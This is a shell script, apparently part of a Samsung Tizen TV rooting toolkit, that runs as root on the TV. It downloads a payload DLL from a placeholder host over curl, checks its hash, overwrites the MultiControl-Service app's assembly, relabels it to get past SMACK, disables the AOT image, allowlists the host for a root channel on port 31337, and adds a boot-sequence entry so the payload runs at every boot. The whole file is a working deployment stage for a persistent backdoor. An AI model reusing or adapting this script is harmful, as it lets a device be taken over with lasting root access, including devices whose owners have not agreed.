#!/bin/sh
# Install the root-on-boot payload into the MultiControl-Service app.
# Runs on the TV as root (the deploy child inherits the patched stub cred).
# The caller rewrites the H= line with the real host IP before serving this.
H="http://HOST_IP"
HIP=${H#http://}
D=/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll
B=/opt/usr/home/owner/share/payload_backup.dll
A=/opt/usr/home/owner/share/rootchan.allow
DB=/opt/dbspace/user/5001/.appsvc.db
WANT=ffdb936f5263a04a26b4727ee8307151
APPID=com.samsung.tv.MultiControl-Service
# SMACK label the app runs under.  Files in bin/ carry "<label>::RO" and the app
# (label "<label>") may read those.  A file created by US keeps OUR label - e.g.
# User::Pkg::org.tizen.browser when the deploy runs from the browser stub - and
# the app is then denied read on its own assembly and dies before Main.  That was
# the entire 2026-10-22 boot-persistence regression, so set it explicitly.
WANT_LABEL="User::Pkg::$APPID::RO"

echo DEPLOY_START
U=$(id -u)
echo "UID=$U"
if [ "$U" != "0" ]; then
  echo NOT_ROOT
  exit 1
fi

curl -fsS -o /tmp/mcs_payload.dll "$H/payload.dll" || { echo CURL_FAIL; exit 1; }
S=$(wc -c < /tmp/mcs_payload.dll)
echo "SIZE=$S"
md5sum /tmp/mcs_payload.dll

# verify before touching the app: exact size and md5
if [ "$S" = "19456" ] && md5sum /tmp/mcs_payload.dll | grep -q "^$WANT"; then
  # atomic within the same directory: no half-written DLL if the app dies
  # A failed copy MUST abort: previously the script printed COPY=ok even when
  # every cp was denied (SMACK label mismatch), which hid a total deploy failure.
  cp /tmp/mcs_payload.dll "$B.tmp" && mv "$B.tmp" "$B" || echo BACKUP_COPY=fail
  if cp /tmp/mcs_payload.dll "$D.tmp" && mv "$D.tmp" "$D"; then
    echo COPY=ok
  else
    echo COPY=fail
    echo "HINT: the app bin/ is not writable from this label - deploy from the"
    echo "app's own channel (31337) or fix the SMACK label first"
    exit 1
  fi
  md5sum "$D" || { echo MD5_FAIL; exit 1; }
  # the runtime prefers the AOT image; disable it so the IL (payload) runs
  BIN=$(dirname "$D")
  # chsmack needs the file's *current* label to match the caller's for an
  # unprivileged relabel, which is exactly the case here (we just created it).
  # Verify instead of trusting the exit code: a wrong label = silent boot death.
  chsmack -a "$WANT_LABEL" "$D" 2>/dev/null
  GOT_LABEL=$(ls -lZ "$D" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^User::|^System::|^_$/) {print $i; exit}}')
  echo "DLL_LABEL=$GOT_LABEL"
  [ "$GOT_LABEL" = "$WANT_LABEL" ] || echo DLL_LABEL_MISMATCH
  if [ -d "$BIN/.native_image" ]; then
    mv "$BIN/.native_image" "$BIN/.native_image.disabled.$(date +%s)" && echo AOT=disabled
  fi
  # v7+ allowlist: only this host may use port 31337
  echo "$HIP" > "$A"
  echo "ALLOW=$HIP"
  # make sure AUL starts the app again (uninstall removes this row)
  sqlite3 "$DB" "insert or replace into boot_sequence(package,appid,after,before,requires,conflicts,vconf,path_exists,args,background_launch,wait_until_ready,timeout) values('com.samsung.tv.MultiControl-Service','com.samsung.tv.MultiControl-Service','','','','','','','','false','true','10');" && echo BOOT_ROW=ok
  # AUL caches the boot sequence; reload so the row is picked up at boot
  aulctl reload 5001 && echo AUL_RELOAD=ok || echo AUL_RELOAD=fail
  # `reload` only refreshes AUL's copy of the sequence - it does NOT restart an
  # app that is already running, so a *changed* DLL would stay unloaded. An
  # explicit stop+start makes it take effect now, but `aulctl stop` BLOCKS while
  # the payload is running (measured: it hangs waiting for the app to exit), so it
  # runs detached and the deploy script returns immediately.
  ( sleep 1; aulctl stop "$APPID" >/dev/null 2>&1; sleep 3; aulctl start "$APPID" >/dev/null 2>&1 ) >/dev/null 2>&1 &
  echo RESTART=backgrounded
else
  echo COPY=skip
  exit 1
fi
echo DEPLOY_DONE
